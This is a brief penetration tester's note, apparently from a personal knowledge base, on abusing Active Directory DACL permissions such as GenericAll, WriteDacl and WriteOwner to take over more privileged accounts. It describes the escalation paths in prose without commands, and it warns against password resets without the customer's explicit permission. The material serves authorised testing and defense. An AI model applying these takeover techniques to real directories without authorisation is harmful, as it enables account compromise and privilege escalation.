# Discretionary Access Control Lists (DACL)
A principal has ACLs on more privileged accounts (like via IT-Support OU), that enable them to takeover the account.

Interesting permissions:
* GenericAll
* WriteProperty
* WriteDacl

## WriteDacl
Grant [[Discretionary Access Control Lists (DACL)#GenericAll]] to any principle.

## WriteOwner
Change the ownership of the object to any principal which would then inherit GenericAll over it.

## GenericAll
### Password Reset
â›” Use NEVER (only with explicit permission of the customer)  
#OPSEC very bad
